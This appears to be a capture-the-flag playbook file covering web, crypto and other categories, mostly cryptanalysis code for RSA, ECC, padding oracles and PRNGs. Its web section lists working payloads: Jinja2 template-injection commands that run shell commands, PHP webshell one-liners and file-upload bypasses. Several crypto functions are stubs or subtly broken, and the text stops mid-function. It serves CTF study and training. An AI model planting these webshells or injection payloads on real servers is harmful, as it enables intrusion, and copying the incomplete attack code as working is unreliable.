---
name: ctf-playbook
description: CTF (Capture The Flag) competition playbook — Web, Crypto, Reverse Engineering,
  PWN/Binary Exploitation, Forensics, Steganography, OSINT, and Misc categories. Covers
  methodology, tools, common vulnerabilities, and exploit patterns for each CTF category.
version: 1.0.0
category: red-teaming
license: MIT
metadata:
  hermes:
    tags:
    - CTF
    - capture-the-flag
    - crypto
    - reversing
    - pwn
    - binary-exploitation
    - forensics
    - steganography
    - OSINT
    - web-exploitation
    related_skills:
    - web-app-pentest
    - client-auth-bypass
    - security-orchestrator
    - network-pentest
    origin: import
---

# CTF Playbook

Comprehensive playbook for CTF competitions. Each category has its methodology, tools, common challenges, and exploit patterns.

## Category Quick Reference

| Category | Common tools | Typical challenges |
|:---------|:-------------|:-------------------|
| **Web** | Burp Suite, curl, Python requests | SQLi, XSS, SSTI, LFI, SSRF, deserialization, JWT |
| **Crypto** | Python, SageMath, CyberChef, RsaCtfTool | RSA, AES, padding oracle, hash collisions, classical ciphers |
| **Reverse Engineering** | Ghidra, IDA Free, radare2, gdb, angr | Binary analysis, obfuscation, packing, custom VMs |
| **PWN** | pwntools, gdb/pwndbg, ROPgadget, checksec | Buffer overflow, ROP, format string, heap exploitation |
| **Forensics** | binwalk, foremost, volatility, Wireshark, strings | File carving, memory forensics, PCAP analysis, disk images |
| **Steganography** | steghide, zsteg, stegsolve, exiftool, binwalk | Image stego, audio stego, LSB, metadata |
| **OSINT** | Google dorking, Shodan, WHOIS, social media | Geolocation, image analysis, social engineering |
| **Misc** | Everything else | Programming, logic puzzles, game hacking, protocols |

---

## WEB

### Quick Start — The Web Checklist

```
1. View page source (Ctrl+U) — comments, hidden fields, debug info
2. Check robots.txt, sitemap.xml, .git/, .env, .DS_Store
3. Check all cookies, localStorage, sessionStorage
4. Check HTTP headers (X-Powered-By, Server, Set-Cookie)
5. Try default credentials (admin:admin, admin:password)
6. Test for SQLi in every parameter
7. Test for SSTI if {{7*7}} appears in output
8. Test for LFI with ../../etc/passwd
9. Check file upload for unrestricted types
10. Look for JWT tokens — try alg:none, weak secrets
```

### Common CTF Web Vulnerabilities

```python
# SSTI quick check — if {{7*7}} outputs 49, SSTI exists
SSTI_CHECK = '{{7*7}}'

# Flask/Jinja2 RCE
JINJA2_RCE = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"
JINJA2_RCE_ALT = "{{ config.__class__.__init__.__globals__['os'].popen('cat /flag*').read() }}"

# PHP type juggling
PHP_MAGIC_HASH = '240610708'  # == 'QNKCDZO' in PHP loose comparison
PHP_TYPE_JUGGLE = {
    '0e12345': '0e67890',  # both evaluate to 0 in scientific notation
    'NULL': 'array() == NULL in PHP < 8',
}

# Node.js prototype pollution
NODE_PROTO = '{"__proto__":{"isAdmin":true}}'
NODE_PROTO2 = '{"constructor":{"prototype":{"isAdmin":true}}}'

# Deserialization
PHP_UNSERIALIZE_POP = '''
O:8:"Example1":1:{s:10:"cache_file";s:14:"/tmp/shell.php";}
'''
```

### File Upload Bypass Techniques

```python
FILE_UPLOAD_BYPASS = {
    'double_extension': 'shell.php.jpg',
    'null_byte': 'shell.php%00.jpg',
    'mime_bypass': "Content-Type: image/jpeg (with .php content)",
    'magic_bytes': 'GIF89a;\\n<?php system($_GET["cmd"]); ?>',  # starts with GIF header
    'svg_xss': '<svg/onload=alert(1)>',
    'phar_file': 'Create .phar archive with PHP payload',
    'htaccess': 'Upload .htaccess to execute custom extensions',
    'polyglot': 'Create files valid as both image and PHP',
}

# PHP webshell one-liner (for file upload challenges)
PHP_WEBSHELLS = [
    '<?php system($_GET["cmd"]); ?>',
    '<?php echo shell_exec($_GET["cmd"]); ?>',
    '<?=`$_GET[0]`?>',  # shortest
    '<script language="php">system($_GET[0]);</script>',
]
```

---

## CRYPTO

### Classical Ciphers

```python
# Caesar cipher
def caesar(text: str, shift: int) -> str:
    result = []
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result.append(chr((ord(c) - base + shift) % 26 + base))
        else:
            result.append(c)
    return ''.join(result)

# Vigenère cipher
def vigenere(text: str, key: str, decrypt: bool = True) -> str:
    result = []
    key_idx = 0
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            shift = ord(key[key_idx % len(key)].upper()) - ord('A')
            if decrypt:
                shift = -shift
            result.append(chr((ord(c) - base + shift) % 26 + base))
            key_idx += 1
        else:
            result.append(c)
    return ''.join(result)

# XOR cipher
def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

# XOR single-byte key brute force
def xor_brute_single_byte(data: bytes):
    results = []
    for key in range(256):
        decrypted = bytes(b ^ key for b in data)
        # Score by English character frequency
        score = sum(1 for b in decrypted if 32 <= b < 127)
        results.append((key, decrypted, score))
    return sorted(results, key=lambda x: x[2], reverse=True)
```

### RSA Attacks

```python
# RSA Common attacks checklist
RSA_ATTACKS = [
    'Small e (e=3): Cube root attack if m^e < n',
    'Common modulus: Same n, different e — extended GCD',
    'Small p or q: FactorDB lookup',
    'Close primes: Fermat factorization if |p-q| is small',
    'Wiener attack: Small d (d < n^0.25)',
    'Boneh-Durfee: Larger d (d < n^0.292)',
    'Håstad broadcast: Same message sent to e different recipients',
    'Franklin-Reiter: Related messages with same modulus',
    'Coppersmith: Known high bits of message or factor',
    'GCD of multiple keys: Find common factors across many public keys',
]

# Quick RSA decode from PEM
def rsa_from_pem(pem_data: str):
    """Extract n, e from PEM public key."""
    from cryptography.hazmat.primitives import serialization
    key = serialization.load_pem_public_key(pem_data.encode())
    numbers = key.public_numbers()
    return numbers.n, numbers.e

# Check if n is in FactorDB
def factordb_check(n: int):
    import requests
    r = requests.get(f'http://factordb.com/api?query={n}')
    data = r.json()
    if data['status'] == 'FF':  # fully factored
        factors = data['factors']
        return factors
    return None
```

### AES Attacks

```python
AES_MODES_ATTACKS = {
    'ECB': 'Identical plaintext blocks → identical ciphertext blocks. Penguin attack.',
    'CBC': 'Padding oracle if server reveals padding errors. Bit flipping on IV.',
    'CTR': 'Nonce reuse → XOR ciphertexts to get XOR of plaintexts.',
    'GCM': 'Nonce reuse → H key recovery → full forgery.',
    'OFB/CFB': 'Bit flipping attack — single bit change in ciphertext flips corresponding bit in plaintext.',
}

# Padding oracle attack (CBC mode)
def padding_oracle(ciphertext: bytes, iv: bytes, oracle_fn, block_size: int = 16) -> bytes:
    """Generic padding oracle attack on CBC mode.
    oracle_fn: function(ct, iv) -> bool (True if padding valid)
    """
    blocks = [iv] + [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    plaintext = b''
    
    for block_idx in range(1, len(blocks)):
        intermediate = bytearray(block_size)
        for byte_pos in range(block_size - 1, -1, -1):
            pad_value = block_size - byte_pos
            crafted_iv = bytearray(block_size)
            for j in range(block_size - 1, byte_pos, -1):
                crafted_iv[j] = intermediate[j] ^ pad_value
            
            found = False
            for guess in range(256):
                crafted_iv[byte_pos] = guess
                if oracle_fn(blocks[block_idx], bytes(crafted_iv)):
                    intermediate[byte_pos] = guess ^ pad_value
                    found = True
                    break
            
            if not found:
                crafted_iv[byte_pos] = intermediate[byte_pos] ^ 1
                if oracle_fn(blocks[block_idx], bytes(crafted_iv)):
                    intermediate[byte_pos] = intermediate[byte_pos] ^ 1
                    found = True
        
        pt_block = bytes(a ^ b for a, b in zip(intermediate, blocks[block_idx - 1]))
        plaintext += pt_block
    
    return plaintext
```

## Elliptic Curve Cryptography (ECC) Attacks

### ECC Basics

```python
# ECC parameters: y² = x³ + ax + b (mod p)
# Standard curves: secp256k1 (Bitcoin), secp256r1/P-256 (NIST), Curve25519

# Verify point is on curve
def on_curve(x, y, a, b, p):
    return (y * y) % p == (x**3 + a*x + b) % p

# Point addition (Weierstrass form)
def point_add(P, Q, a, p):
    if P is None: return Q
    if Q is None: return P
    x1, y1 = P
    x2, y2 = Q
    if x1 == x2:
        if (y1 + y2) % p == 0:
            return None  # Point at infinity
        lam = ((3*x1*x1 + a) * pow(2*y1, -1, p)) % p
    else:
        lam = ((y2 - y1) * pow(x2 - x1, -1, p)) % p
    x3 = (lam*lam - x1 - x2) % p
    y3 = (lam*(x1 - x3) - y1) % p
    return (x3, y3)

# Scalar multiplication (double-and-add)
def scalar_mult(k, P, a, p):
    result = None
    addend = P
    while k:
        if k & 1:
            result = point_add(result, addend, a, p)
        addend = point_add(addend, addend, a, p)
        k >>= 1
    return result
```

### ECC Attack #1: Pohlig-Hellman (Small Subgroup)

```python
def pohlig_hellman(G, Q, n_factors, a, p):
    """Solve discrete log when order n has small factors.
    n_factors: list of (prime, exponent) factorization of curve order
    """
    from sympy.ntheory import factorint
    
    factors = factorint(sum(p**e for p, e in n_factors))
    residues = []
    moduli = []
    
    for prime, exp in factors.items():
        mod = prime ** exp
        # Compute discrete log modulo prime^exp
        Gi = scalar_mult(sum(p**e for p, e in n_factors) // mod, G, a, p)
        Qi = scalar_mult(sum(p**e for p, e in n_factors) // mod, Q, a, p)
        
        # Baby-step Giant-step for small subgroup
        m = int(mod ** 0.5) + 1
        table = {}
        current = None
        for j in range(m):
            table[current] = j
            current = point_add(current, Gi, a, p)
        
        factor = scalar_mult(m, Gi, a, p)
        current = Qi
        k_partial = None
        for j in range(m):
            if current in table:
                k_partial = (j * m + table[current]) % mod
                break
            current = point_add(current, (factor[0], p - factor[1]), a, p)
        
        if k_partial is not None:
            residues.append(k_partial)
            moduli.append(mod)
    
    # CRT to combine
    from sympy.ntheory.modular import crt
    return crt(moduli, residues)[0]
```

### ECC Attack #2: Invalid Curve Attack

```python
def invalid_curve_attack(G_original, Q_target, a_original, b_original, p, n):
    """If server doesn't validate point is on curve, use invalid curve with smooth order."""
    
    # Find a b' such that point (x_target, y) is on curve y²=x³+ax+b' with smooth order
    # For each x in small range, compute b' = y² - x³ - ax (mod p)
    # Check if resulting curve has small factors
    
    for x_test in range(1, 1000):
        # Compute y² from target point's x
        y_sq = (x_test**3 + a_original * x_test + b_original) % p
        y = pow(y_sq, (p + 1) // 4, p)  # if p ≡ 3 mod 4
        
        # Create curve with same a but different b
        # Check if order of this curve has small factors
        
        # ... (implementation depends on specific scenario)
        pass
```

### ECC Attack #3: ECDSA Nonce Reuse / Bias

```python
# ECDSA signature: (r, s)
# r = (k*G).x mod n
# s = k⁻¹ * (hash + r*d) mod n (d = private key)

def ecdsa_nonce_reuse(sig1, sig2, z1, z2, n):
    """Recover private key when same nonce k is used for two signatures."""
    r1, s1 = sig1
    r2, s2 = sig2
    
    if r1 != r2:
        return None  # Different nonces
    
    # k = (z1 - z2) / (s1 - s2) mod n
    k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
    
    # d = (s1*k - z1) / r1 mod n
    d = ((s1 * k - z1) * pow(r1, -1, n)) % n
    return d

def ecdsa_small_k_recovery(r, s, z, n, k_max=2**16):
    """Brute force small nonce k to recover private key."""
    for k in range(1, k_max + 1):
        # d = (s*k - z) / r mod n
        d = ((s * k - z) * pow(r, -1, n)) % n
        # Verify: compute public key and check against known
        # ...
    return None
```

## Lattice-Based Attacks

### LLL Algorithm for Cryptanalysis

```python
# LLL (Lenstra-Lenstra-Lovász) — lattice basis reduction
# Used for: Coppersmith, Boneh-Durfee, hidden number problem, subset sum

def create_lattice(basis):
    """Create a lattice matrix from basis vectors."""
    import numpy as np
    # A lattice L is the set of all integer combinations of basis vectors
    return np.array(basis, dtype=object)

def solve_lll(M):
    """Generic LLL wrapper — many implementations available."""
    from sympy import Matrix
    M_sympy = Matrix(M.tolist())
    reduced = M_sympy.LLL()
    return [[int(x) for x in row] for row in reduced.tolist()]

# Coppersmith's Method — find small roots of polynomial modulo N
# Used for: Stereotyped messages, partial key exposure, Franklin-Reiter

def coppersmith_howgrave_graham(f, N, X, beta=1.0):
    """Coppersmith's method: find x₀ < X such that f(x₀) ≡ 0 (mod N)."""
    # 1. Build lattice of shifted polynomials: g_{i,j}(x) = N^{m-i} * x^j * f^i(x)
    # 2. Apply LLL to get short vectors
    # 3. The short vectors give polynomials over ℤ (not just mod N)
    # 4. Solve over ℤ to get small roots
    pass

# Hidden Number Problem (HNP) for ECDSA nonce bias
def hnp_boneh_venkatesan(known_bits, signatures, n, msb_count):
    """
    If most significant bits of ECDSA nonce k are known,
    recover private key via lattice reduction.
    
    known_bits[i]: top `msb_count` bits of nonce k_i
    signatures[i]: (r_i, s_i)
    z_i: message hash
    """
    t = len(signatures)
    # Build lattice: each row corresponds to one signature
    # Bottom-right n * I (identity)
    # Use LLL to find short vector revealing private key
    pass
```

### ROCA Attack (CVE-2017-15361)

```python
def roca_attack(n):
    """Attack RSA keys generated by Infineon TPM/HSM (ROCA vulnerability).
    These keys have primes of form: p = k * M + (65537^a mod M)
    where M = product of first N primes.
    """
    # Key insight: p ≡ 65537^a (mod M) for some small a
    # M = 2 * 3 * 5 * 7 * ... * 167 (product of first 39 primes)
    M = 1
    primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61,
              67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137,
              139, 149, 151, 157, 163, 167]
    for p in primes:
        M *= p
    
    # Calculate all possible residues of p mod M
    # (65537^a mod M for a in range)
    # Then use Coppersmith to recover full factorization
    # ...
    return False
```

## Hash Attacks

### Hash Length Extension Attack

```python
import struct

def md_pad(message: bytes, key_len_hint: int = 0) -> bytes:
    """MD construction padding (MD5, SHA1, SHA256)."""
    ml = (key_len_hint + len(message)) * 8  # message length in bits
    message += b'\x80'
    while (len(message) + key_len_hint) % 64 != 56:
        message += b'\x00'
    message += struct.pack('>Q', ml)  # big-endian for SHA256
    return message

def hash_length_extension(original_hash: bytes, original_message: bytes, 
                         append_data: bytes, key_len: int, hash_func) -> bytes:
    """Extend a hash without knowing the secret key.
    Works for: MD5, SHA1, SHA256, SHA512 (all Merkle-Damgård constructions).
    NOT for: SHA3, BLAKE2, HMAC (immune).
    
    Example: hash = SHA256(key || message)
    → We can compute SHA256(key || message || padding || append_data)
    without knowing key!
    """
    # 1. Pad original message as if key_len + message_len
    padded = md_pad(original_message, key_len)
    
    # 2. Set internal state to original hash
    # 3. Process append_data + new padding
    # 4. Return new hash
    # (Implementation depends on hash library)
    pass

# HMAC length extension doesn't work because HMAC uses double hashing:
# HMAC(k, m) = H((k ⊕ opad) || H((k ⊕ ipad) || m))
```

### Hash Collision Attacks

```python
# MD5 collisions (broken since 2004, Wang et al.)
# SHA1 collisions (SHAttered, 2017 — 2^63 work)
# Both should NEVER be used for security

# Multicollisions via Joux's attack (2004):
# Find 2-block collisions iteratively → 2^k-way collision in k * cost of one collision
# Does not apply to wide-pipe hashes (SHA-512/256) or tree constructions (SHA3)

# Chosen-prefix collision: even more powerful
# MD5: practical (used for Flame malware cert, ~2009)
# SHA1: 2^63.4 operations (Leurent & Peyrin, 2020)
```

### PRNG / Random Number Generator Attacks

```python
# Mersenne Twister (MT19937) — fully predictable after 624 consecutive outputs

class MT19937Cracker:
    """Crack the Mersenne Twister PRNG given 624 consecutive 32-bit outputs."""
    
    def __init__(self):
        self.state = [0] * 624
        self.index = 0
    
    def feed(self, output: int):
        """Feed one observed output to reconstruct internal state."""
        # Untemper the output to recover internal state word
        y = output
        y ^= (y >> 18)
        y ^= (y << 15) & 0xEFC60000
        
        # More tempering reversal...
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y >> 11)
        
        self.state[self.index] = y
        self.index += 1
        return self.index >= 624
    
    def predict(self) -> int:
        """Predict the next random output."""
        if self.index < 624:
            return None  # Not enough data
        
        # Twist and generate
        # ...
        pass

# LCG (Linear Congruential Generator) — breaks with 3-6 outputs
def crack_lcg(observed: list, modulus: int = None):
    """Recover LCG parameters from outputs.
    LCG: X_{n+1} = (a * X_n + c) mod m
    """
    if modulus is None:
        # Recover modulus from consecutive differences
        # m = gcd of (Xₙ₊₂ - Xₙ₊₁)² - (Xₙ₊₁ - Xₙ)(Xₙ₊₃ - Xₙ₊₂) over several windows
        diffs = [observed[i+1] - observed[i] for i in range(len(observed)-1)]
        # m divides gcd of (t_{n+1}² - t_n * t_{n+2})
        # ...
    pass

# Java Random — breaks with 2 consecutive ints
# C rand() — breaks with ~5 outputs
# PHP mt_rand() — breaks with 2 outputs (seeded with PID + time)
```

### Bleichenbacher PKCS#1 v1.5 Padding Oracle

```python
def bleichenbacher_oracle(ct, n, e, oracle_fn, max_queries=1000000):
    """
    Classic Bleichenbacher attack on RSA PKCS#1 v1.5.
    PKCS#1 v1.5 format: 00 || 02 || PS || 00 || D
    (PS = random non-zero padding bytes, minimum 8 bytes)
    oracle_fn(ct) -> bool: True if decryption has valid PKCS#1 padding
    """
    B = 2 ** (n.bit_length() - 16)  # 2^(8*(k-2))
    M = [(2*B, 3*B - 1)]  # intervals where plaintext could be
    
    # Step 1: Blinding (find s₀ such that c * s₀^e mod n is PKCS conforming)
    s = 1
    while True:
        c_new = (ct * pow(s, e, n)) % n
        if oracle_fn(c_new):
            break
        s += 1
    
    # Step 2: Narrow intervals
    for _ in range(max_queries):
        # Step 2a: Find smallest s > previous s
        # Step 2b: If multiple intervals, try each
        # Step 2c: Narrow M based on oracle responses
        # Continue until |M| == 1 and interval length == 1
        pass
```

### Key Recovery from Weak RSA Parameters

```python
# Common weak RSA scenarios
WEAK_RSA_CHECKS = {
    'small_exponent': 'e=3 → if m^3 < n, cube root attack. Also Håstad broadcast.',
    'small_d': 'd < n^0.25 → Wiener attack. d < n^0.292 → Boneh-Durfee.',
    'close_primes': '|p-q| small → Fermat factorization. sqrt(n) then scan up.',
    'common_factor': 'GCD attack across many public keys (batch GCD).',
    'factordb': 'Check if n is already factored in FactorDB.',
    'roca': 'Check if p,q generated by vulnerable Infineon library (CVE-2017-15361).',
    'small_q': 'If q < 2^50, brute force possible.',
    'reused_primes': 'If p from key A = p from key B, GCD reveals both.',
}

# Wiener's Attack (small private exponent)
def wiener_attack(n, e):
    """Recover d when d < n^0.25 using continued fractions."""
    def continued_fraction(num, den):
        cf = []
        while den:
            q = num // den
            cf.append(q)
            num, den = den, num - q * den
        return cf
    
    def convergents(cf):
        """Compute convergents from continued fraction."""
        convs = []
        p_minus_2, q_minus_2 = 0, 1
        p_minus_1, q_minus_1 = 1, 0
        for a in cf:
            p0 = a * p_minus_1 + p_minus_2
            q0 = a * q_minus_1 + q_minus_2
            convs.append((p0, q0))
            p_minus_2, p_minus_1 = p_minus_1, p0
            q_minus_2, q_minus_1 = q_minus_1, q0
        return convs
    
    cf = continued_fraction(e, n)
    for k, d in convergents(cf):
        if k == 0 or d % 2 == 0:
            continue
        phi = (e * d - 1) // k
        # Solve: x² - (n - phi + 1)x + n = 0
        b = n - phi + 1
        discriminant = b*b - 4*n
        if discriminant >= 0:
            sqrt_d = int(discriminant ** 0.5)
            if sqrt_d * sqrt_d == discriminant:
                p = (b + sqrt_d) // 2
                q = (b - sqrt_d) // 2
                if p * q == n:
                    return d, p, q
    return None

# Batch GCD — find common factors across many RSA moduli
def batch_gcd(moduli):
    """Given many RSA moduli, find pairs sharing factors."""
    from math import gcd
    
    # Product tree approach for efficient batch GCD
    # Build product tree, then compute remainders
    # O(n log n) instead of O(n²)
    
    # Simple pairwise check (slow but works for small sets)
    shared = []
    for i in range(len(moduli)):
        for j in range(i+1, len(moduli)):
            g = gcd(moduli[i], moduli[j])
            if g > 1:
                shared.append((i, j, g))
    return shared

# Discrete Log Attacks (over finite fields)
DLP_ATTACKS = {
    'bsgs': 'Baby-step Giant-step — O(sqrt(n)) time/space',
    'pollard_rho': 'Probabilistic, O(sqrt(pi*n/2)) time, O(1) space',
    'pohlig_hellman': 'If n-1 has small factors, attack each subgroup + CRT',
    'index_calculus': 'Subexponential for multiplicative groups of finite fields',
    'function_field_sieve': 'L_p(1/3) for small characteristic fields (Joux 2013)',
    'number_field_sieve': 'Best for prime fields, L_n(1/3, c)',
}

# SageMath quick helpers for CTF crypto
"""
# In SageMath, many attacks are one-liners:
n = 0x...
e = 0x...
c = 0x...

# Factor n (try online if small)
# factordb.com or alpertron.com.ar/ECM.HTM
p, q = factor(n)  # Sage

# Compute private key
phi = (p-1)*(q-1)
d = inverse_mod(e, phi)
m = pow(c, d, n)
print(bytes.fromhex(hex(m)[2:]))

# Discrete log in Sage:
F = GF(p)
g = F(generator)
h = F(target)
x = discrete_log(h, g)
"""
```

### Post-Quantum Cryptography (Overview for CTF)

```python
PQC_RELEVANT = {
    'lattice': 'Kyber (ML-KEM), Dilithium (ML-DSA), Falcon — based on LWE/SIS',
    'code': 'Classic McEliece — based on decoding random linear codes',
    'hash': 'SPHINCS+ — stateless hash-based signatures',
    'isogeny': 'SIKE (broken 2022, Castryck-Decru attack on SIDH)',
    'multivariate': 'Rainbow, GeMSS — solving multivariate quadratic equations',
}

# LWE (Learning With Errors) basics for CTF:
# Given: A (m×n matrix), b = A*s + e (mod q)
# Goal: recover secret s
# Attack: If error e is small, solve via lattice reduction (LLL/BKZ)
# A = [A | b]; Short vector in lattice reveals s

# Side-channel intro (for CTF with leaky oracles):
SIDE_CHANNEL_ATTACKS = {
    'timing': 'Measure response time differences → infer bit patterns (e.g., RSA square-and-multiply)',
    'padding_oracle': 'Server reveals padding validity → decrypt without key (CBC, PKCS#1)',
    'error_oracle': 'Server reveals error details → bit-by-bit decryption',
    'length_oracle': 'Compressed + encrypted length reveals plaintext (CRIME/BREACH)',
    'power_analysis': 'DPA/CPA on hardware implementations — out of scope for typical CTF',
}
```

---

# DEEP CRYPTOGRAPHY ATTACKS

## Advanced RSA Attacks

### Boneh-Durfee Attack (d < N^0.292)

Extends Wiener beyond N^0.25 using Coppersmith + lattice reduction on bivariate polynomial:

```python
# SageMath implementation of Boneh-Durfee (Herrmann-May variant)
# From: https://github.com/mimoo/RSA-and-LLL-attacks

def boneh_durfee(N, e, delta=0.292, m=4, tau=None):
    """
    Recover private exponent d when d < N^delta.
    Uses lattice reduction on: f(x,y) = 1 + x*(A + y) where A = -(N+1)
    
    Parameters:
        delta: bound d < N^delta (0.292 max provable)
        m: lattice dimension parameter (higher = better but slower)
        tau: multiplier for t (default: 1-2*delta)
    """
    if tau is None:
        tau = 1 - 2 * delta
    
    A = -(N + 1)  # f(x,y) = 1 + x*(A + y)
    
    # Build lattice of shifted polynomials
    # x-shifts: g_{i,k}(x,y) = x^i * f^k(x,y) * N^{max(0,m-k)}
    # y-shifts: h_{j,k}(x,y) = y^j * f^k(x,y) * N^{max(0,m-k)}
    
    R = ZZ['x,y']
    x, y = R.gens()
    
    # Set bounds
    X = floor(2 * N^(delta))  # |x0| < X
    Y = floor(3 * N^0.5)       # |y0| < Y
    
    polynomials = []
    
    # x-shifts
    for k in range(m + 1):
        for i in range(m - k + 1):
            g = x^i * f(x,y)^k * N^(m - k) if k < m else x^i * f(x,y)^k
            polynomials.append(g)
    
    # y-shifts
    t = floor(tau * m)
    for k in range(m + 1):
        for j in range(1, t + 1):
            h = y^j * f(x,y)^k * N^(m - k) if k < m else y^j * f(x,y)^k
            polynomials.append(h)
    
    # Build monomial order and matrix
    monomials = set()
    for p in polynomials:
        monomials.update(p.monomials())
    monomials = sorted(monomials, key=lambda t: t.degree())
    
    n = len(monomials)
    M = Matrix(ZZ, len(polynomials), n)
    
    for i, p in enumerate(polynomials):
        for j, mon in enumerate(monomials):
            coeff = p.monomial_coefficient(mon)
            if coeff != 0:
                M[i, j] = coeff
    
    # Multiply by (X^i * Y^j) to balance
    for j, mon in enumerate(monomials):
        # mon = x^a * y^b
        x_exp = mon.degree(x)
        y_exp = mon.degree(y)
        for i in range(len(polynomials)):
            M[i, j] *= X^x_exp * Y^y_exp
    
    # LLL reduction
    M_reduced = M.LLL()
    
    # Extract polynomials from reduced basis
    polys = []
    for row in M_reduced:
        if all(abs(v) < 2^100 for v in row):  # skip unreasonably large
            p = 0
            for j, mon in enumerate(monomials):
                if row[j] != 0:
                    x_exp = mon.degree(x)
                    y_exp = mon.degree(y)
                    p += (row[j] // (X^x_exp * Y^y_exp)) * mon
            if p != 0:
                polys.append(p)
    
    # Try to find common root using resultants
    for i in range(len(polys)):
        for j in range(i+1, len(polys)):
            # Eliminate y to get polynomial in x only
            rx = polys[i].resultant(polys[j], y)
            if rx != 0:
                roots = rx.univariate_polynomial().roots()
                for root in roots:
                    if root[0] > 0:
                        x0 = int(root[0])
                        # Plug back to find y
                        for p in polys:
                            sol = p.subs(x=x0)
                            if sol != 0:
                                y_roots = sol.univariate_polynomial().roots()
                                for yr in y_roots:
                                    if yr[0] > 0:
                                        y0 = int(yr[0])
                                        # Recover private key
                                        phi = N - int(x0)
                                        d = inverse_mod(e, phi)
                                        if pow(pow(2, e, N), d, N) == 2:
                                            return d, phi
    return None
```

### Common Modulus Attack

```python
def common_modulus_attack(c1, c2, e1, e2, N):
    """Same message encrypted with different public exponents (same N).
    Requires gcd(e1, e2) = 1."""
    g, s1, s2 = xgcd(e1, e2)
    if g != 1:
        return None  # gcd ≠ 1; might still work but more complex
    
    # m = c1^s1 * c2^s2 mod N
    if s1 < 0:
        c1 = inverse_mod(c1, N)
        s1 = -s1
    if s2 < 0:
        c2 = inverse_mod(c2, N)
        s2 = -s2
    
    m = (pow(c1, s1, N) * pow(c2, s2, N)) % N
    return m

# Extended: Same message to e=3 → https://en.wikipedia.org/wiki/Coppersmith%27s_attack
# Håstad broadcast: Same message encrypted with same small e, different N
# => CRT on ciphertexts, then take e-th root
```

### Partial Key Exposure Attacks

```python
def partial_d_lsb_attack(e, N, d_lsb, lsb_bits):
    """If lower lsb_bits of d are known, recover full d using Coppersmith."""
    # d = d_lsb + 2^{lsb_bits} * d0
    # ed = 1 + k*phi(N) → ed ≡ 1 (mod 2^{lsb_bits})
    # → k = (e * d_lsb - 1) / 2^{lsb_bits} mod e (approximately)
    # Then use Coppersmith to find d0
    pass

def partial_p_msb_attack(e, N, p_msb, msb_bits):
    """If upper msb_bits of p are known, factor N with Coppersmith."""
    # p = p_msb + x0 where |x0| < 2^{(n/2)-msb_bits}
    # f(x) = p_msb + x divides N
    # Apply Coppersmith to f(x) to find x0
    pass
```

---

## ECC Deep Attacks

### MOV Attack (Menezes-Okamoto-Vanstone)

Transforms ECDLP to DLP in finite field extension using Weil pairing:

```python
# MOV Attack — requires SageMath
def mov_attack(E, P, Q, max_k=12):
    """
    E: elliptic curve over F_q
    P, Q: points on E, with Q = d*P (d unknown)
    
    Uses Weil pairing to embed ECDLP into F_{q^k}^*
    Attack works when embedding degree k is small.
    """
    n = P.order()
    q = E.base_field().order()
    
    # Find embedding degree k: smallest k such that n | q^k - 1
    k = 1
    while k <= max_k:
        if (q^k - 1) % n == 0:
            break
        k += 1
    
    if k > max_k:
        return "Embedding degree too large — MOV ineffective"
    
    # Extend to field F_{q^k}
    Fqk = GF(q^k)
    E_ext = E.base_extend(Fqk)
    P_ext = E_ext(P)
    Q_ext = E_ext(Q)
    
    # Find point R such that e_n(P, R) ≠ 1
    # (For simplicity, find a point of order n not linearly dependent on P)
    R = E_ext.random_point()
    R = (R.order() // R.order().gcd(n)) * R
    
    # Compute pairings
    alpha = P_ext.weil_pairing(R, n)
    beta = Q_ext.weil_pairing(R, n)
    
    # Now solve d = log_alpha(beta) in F_{q^k}^*
    d = discrete_log(beta, alpha)
    return d

# Frey-Rück Attack: Similar to MOV but uses Tate pairing (often more efficient)
# Decision: MOV vs FR depends on the specific curve and embedding degree
# Both become practical when k ≤ 6 (some curves have k=1,2 → totally broken!)
```

### Invalid Curve Attack (CVE-2020-0601 style)

```python
def invalid_curve_attack_detailed():
    """
    When ECDH implementation doesn't validate that received public key
    is on the correct curve:
    
    1. Find a curve E'(a, b') with same a but different b' such that:
       - The target point's x-coordinate is on E'
       - E' has order with small factors
       
    2. Send points of small order to victim
    3. Victim computes scalar * our_point on the WRONG curve
    4. Use small subgroup DLP (Pohlig-Hellman) to recover scalar bits
    
    This is the basis of the CurveBall attack (CVE-2020-0601).
    """
    pass
```

### Twist Attack

```python
def twist_attack():
    """
    If implementation doesn't distinguish between curve and its quadratic twist:
    
    - Quadratic twist E' of curve E: a' = a, b' = c^2 * b (c non-square)
    - For a random x, either y^2 = x^3+ax+b has solution, OR c^2*y^2 has
    - So ~50% of x values are on E, ~50% on E'
    
    Attack: send points on E' with smooth order to leak scalar bits
    Mitigation: always validate point is on correct curve (on_curve check)
    """
    pass
```

---

## Symmetric Cryptanalysis

### Differential Cryptanalysis (on reduced-round ciphers)

```python
# Core concept: Find input difference ΔX that produces predictable output
# difference ΔY with high probability p >> 2^{-n}

# For CTF reduced-round ciphers:
def differential_attack_simple():
    """
    1. Find high-probability differential trail through N-1 rounds
    2. Encrypt many plaintext pairs (P, P ⊕ ΔX)
    3. For last round, guess subkey bits
    4. Count how many pairs produce expected difference after partial decrypt
    5. Correct subkey maximizes count (wrong ≈ uniform)
    
    Common in CTF: 4-8 round custom Feistel/SPN with known S-box
    """
    pass

# Impossible Differential: Differential with probability 0
# Truncated Differential: Only predict partial output difference
```

### Linear Cryptanalysis (Matsui's Algorithm)

```python
def linear_cryptanalysis_overview():
    """
    Find linear approximation: Σ(plaintext bits) ⊕ Σ(ciphertext bits) = Σ(key bits)
    with bias ε = |p - 1/2| significantly > 0
    
    Piling-up lemma: total bias = 2^{n-1} * Π ε_i
    
    Attack complexity: ~ 1/ε² known plaintexts
    
    CTF scenario: given 10K-100K plaintext-ciphertext pairs for 4-8 round cipher
    → find linear approximation, recover last round key
    """
    pass
```

### Meet-in-the-Middle (MITM)

```python
def mitm_2des():
    """Double-DES: E_k2(E_k1(P)) = C
    MITM: 2^56 space, 2^57 time (vs 2^112 brute force)"""
    
    # Phase 1: Encrypt P with all k1, store (E_k1(P), k1)
